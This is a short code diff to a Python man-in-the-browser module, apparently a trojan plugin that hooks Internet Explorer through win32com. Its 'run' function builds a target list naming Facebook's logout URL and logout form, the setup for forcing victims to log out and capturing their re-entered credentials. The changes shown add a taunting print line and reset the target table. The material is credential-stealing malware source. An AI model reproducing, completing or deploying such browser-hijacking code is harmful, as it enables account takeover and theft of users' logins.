@@ -69,7 +69,9 @@ def mitb(windows):
       time.sleep(0) 
 
 def run(**args):
+ print "Screwing Internet Explorer!!!"
  global target_sites
+ target_sites = {}
  target_sites["www.facebook.com"] = \
      {"logout_url"      : None, 
       "logout_form"     : "logout_form", 
@@ -99,3 +101,4 @@ def run(**args):
  windows = win32com.client.Dispatch(clsid)
  mitb(windows)
  return str("started")
+ 
